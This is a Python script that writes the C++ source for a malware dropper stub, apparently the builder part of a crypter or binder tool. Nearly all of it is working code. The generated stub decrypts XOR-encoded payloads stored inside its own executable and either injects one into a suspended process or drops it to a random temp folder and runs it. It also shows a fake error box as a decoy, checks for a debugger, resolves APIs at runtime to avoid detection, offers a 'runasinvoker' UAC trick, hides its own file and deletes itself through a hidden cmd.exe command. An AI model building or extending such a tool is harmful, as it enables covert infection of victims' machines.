import os
import random
import string

def escape_cpp_string(s):
    """Escapes a string for safe embedding in C++ source code."""
    return s.replace('\\', '\\\\').replace('"', '\\"')

def generate_cpp_code(**kwargs):
    """Generates the C++ source code for the stub."""
    # Safely escape all string data coming from the UI
    xor_key = escape_cpp_string(kwargs['xor_key'])
    msg_title_escaped = escape_cpp_string(kwargs["msg_title"])
    msg_text_escaped = escape_cpp_string(kwargs["msg_text"])
    target_proc_escaped = escape_cpp_string(kwargs['target_proc'])
    file1_filename_escaped = escape_cpp_string(os.path.basename(kwargs['file1_filename']))
    file2_filename_escaped = escape_cpp_string(os.path.basename(kwargs['file2_filename'])) if kwargs['file2_size'] > 0 else ""

    anti_debug_logic = "if (IsDebuggerPresent()) return 1;" if kwargs['use_anti_debug'] else ""
    
    msgbox_type_map = {
        "Error": "MB_OK | MB_ICONERROR", "Ошибка": "MB_OK | MB_ICONERROR", "Помилка": "MB_OK | MB_ICONERROR",
        "Information": "MB_OK | MB_ICONINFORMATION", "Информация": "MB_OK | MB_ICONINFORMATION", "Інформація": "MB_OK | MB_ICONINFORMATION",
        "Warning": "MB_OK | MB_ICONWARNING", "Предупреждение": "MB_OK | MB_ICONWARNING", "Попередження": "MB_OK | MB_ICONWARNING"
    }
    msgbox_type_constant = msgbox_type_map.get(kwargs['msgbox_type'], "MB_OK | MB_ICONERROR")
    msgbox_logic = f'pMessageBoxA(NULL, "{msg_text_escaped}", "{msg_title_escaped}", {msgbox_type_constant});' if kwargs['use_msgbox'] else ''
    
    self_hide_logic = 'pSetFileAttributesA(own_path, FILE_ATTRIBUTE_HIDDEN);' if kwargs['self_hide'] else ''
    self_destruct_command = 'cmd.exe /c timeout /t 3 /nobreak > NUL && del \\"%s\\"'
    self_destruct_logic = f'char cmd[MAX_PATH*2]; wsprintfA(cmd, "{self_destruct_command}", own_path); WinExec(cmd, SW_HIDE);' if kwargs['self_destruct'] else ''

    file1_load_logic = f"""
unsigned long file1_offset = {kwargs['file1_offset']}UL;
unsigned long file1_size = {kwargs['file1_size']}UL;
std::vector<unsigned char> file1_data_vec(file1_size);
DWORD bytesRead;
SetFilePointer(hSelf, file1_offset, NULL, FILE_BEGIN);
ReadFile(hSelf, file1_data_vec.data(), file1_size, &bytesRead, NULL);
XorCrypt(file1_data_vec.data(), file1_size, xor_key);
"""
    file2_load_logic = ""
    if kwargs['file2_size'] > 0:
        file2_load_logic = f"""
unsigned long file2_offset = {kwargs['file2_offset']}UL;
unsigned long file2_size = {kwargs['file2_size']}UL;
std::vector<unsigned char> file2_data_vec(file2_size);
SetFilePointer(hSelf, file2_offset, NULL, FILE_BEGIN);
ReadFile(hSelf, file2_data_vec.data(), file2_size, &bytesRead, NULL);
XorCrypt(file2_data_vec.data(), file2_size, xor_key);
"""
    uac_bypass_cmd_template_cpp = '/C set __COMPAT_LAYER=runasinvoker && start \\"\\" \\"%s\\"'

    file1_exec_logic = ""
    if kwargs['use_injection']:
        file1_exec_logic = f"""
char target_process[] = "{target_proc_escaped}";
STARTUPINFOA si = {{0}}; PROCESS_INFORMATION pi = {{0}}; si.cb = sizeof(si);
if (pCreateProcessA(NULL, target_process, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {{
    LPVOID remote_mem = pVirtualAllocEx(pi.hProcess, NULL, file1_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remote_mem) {{
        pWriteProcessMemory(pi.hProcess, remote_mem, file1_data_vec.data(), file1_size, NULL);
        pCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote_mem, NULL, 0, NULL);
    }}
    pResumeThread(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
}}
"""
    else:
        file1_exec_logic = f"""
std::string path1 = extractDir + "{file1_filename_escaped}";
if (WriteFileToDisk(path1, file1_data_vec.data(), file1_size)) {{
    {'char uac_cmd_file1[MAX_PATH * 2]; wsprintfA(uac_cmd_file1, "' + uac_bypass_cmd_template_cpp + '", path1.c_str()); pShellExecuteA(NULL, "open", "cmd.exe", uac_cmd_file1, NULL, SW_HIDE);' if kwargs['use_uac_bypass'] and kwargs['uac_bypass_payload'] == 'file1' else f'pShellExecuteA(NULL, "open", path1.c_str(), NULL, NULL, {kwargs["show_cmd1"]});'}
}}
"""
    file2_exec_logic = ""
    if kwargs['file2_size'] > 0:
        file2_exec_logic = f"""
std::string path2 = extractDir + "{file2_filename_escaped}";
if (WriteFileToDisk(path2, file2_data_vec.data(), file2_size)) {{
    {'char uac_cmd_file2[MAX_PATH * 2]; wsprintfA(uac_cmd_file2, "' + uac_bypass_cmd_template_cpp + '", path2.c_str()); pShellExecuteA(NULL, "open", "cmd.exe", uac_cmd_file2, NULL, SW_HIDE);' if kwargs['use_uac_bypass'] and kwargs['uac_bypass_payload'] == 'file2' else f'pShellExecuteA(NULL, "open", path2.c_str(), NULL, NULL, {kwargs["show_cmd2"]});'}
}}
"""

    return f"""
#include <windows.h>
#include <string>
#include <fstream>
#include <vector>
#include <direct.h>
#include <shellapi.h>

typedef int (WINAPI* MessageBoxA_t)(HWND, LPCSTR, LPCSTR, UINT);
typedef BOOL (WINAPI* SetFileAttributesA_t)(LPCSTR, DWORD);
typedef LPVOID (WINAPI *VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
typedef HANDLE (WINAPI *CreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef DWORD (WINAPI *ResumeThread_t)(HANDLE);
typedef void (WINAPI *Sleep_t)(DWORD);
typedef HINSTANCE (WINAPI *ShellExecuteA_t)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
typedef HANDLE (WINAPI* CreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI* ReadFile_t)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef DWORD (WINAPI* SetFilePointer_t)(HANDLE, LONG, PLONG, DWORD);

const char* xor_key = "{xor_key}";
const char* extract_subdir = "{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}\\\\";

void XorCrypt(unsigned char* data, size_t size, const char* key) {{
    size_t key_len = strlen(key);
    for (size_t i = 0; i < size; ++i) data[i] ^= key[i % key_len];
}}
bool WriteFileToDisk(const std::string& path, unsigned char* data, size_t size) {{
    std::ofstream outfile(path, std::ios::binary);
    if (!outfile) return false;
    if (size > 0) outfile.write(reinterpret_cast<const char*>(data), size);
    outfile.close(); return outfile.good();
}}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {{
    {anti_debug_logic}

    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    HMODULE u32 = LoadLibraryA("user32.dll");
    HMODULE s32 = LoadLibraryA("shell32.dll");
    
    MessageBoxA_t pMessageBoxA = (MessageBoxA_t)GetProcAddress(u32, "MessageBoxA");
    SetFileAttributesA_t pSetFileAttributesA = (SetFileAttributesA_t)GetProcAddress(k32, "SetFileAttributesA");
    ShellExecuteA_t pShellExecuteA = (ShellExecuteA_t)GetProcAddress(s32, "ShellExecuteA");
    CreateProcessA_t pCreateProcessA = (CreateProcessA_t)GetProcAddress(k32, "CreateProcessA");
    VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)GetProcAddress(k32, "VirtualAllocEx");
    WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(k32, "WriteProcessMemory");
    CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t)GetProcAddress(k32, "CreateRemoteThread");
    ResumeThread_t pResumeThread = (ResumeThread_t)GetProcAddress(k32, "ResumeThread");
    CreateFileA_t pCreateFileA = (CreateFileA_t)GetProcAddress(k32, "CreateFileA");
    ReadFile_t pReadFile = (ReadFile_t)GetProcAddress(k32, "ReadFile");
    SetFilePointer_t pSetFilePointer = (SetFilePointer_t)GetProcAddress(k32, "SetFilePointer");
    Sleep_t pSleep = (Sleep_t)GetProcAddress(k32, "Sleep");

    char own_path[MAX_PATH];
    GetModuleFileNameA(NULL, own_path, MAX_PATH);

    HANDLE hSelf = pCreateFileA(own_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hSelf == INVALID_HANDLE_VALUE) return 1;

    {msgbox_logic}
    {self_hide_logic}

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string extractDir = std::string(tempPath) + extract_subdir;
    _mkdir(extractDir.c_str());

    {file1_load_logic}
    {file1_exec_logic}
    
    {file2_load_logic}
    {file2_exec_logic}
    
    CloseHandle(hSelf);

    if(pSleep) pSleep(1000);

    {self_destruct_logic}

    return 0;
}}
"""
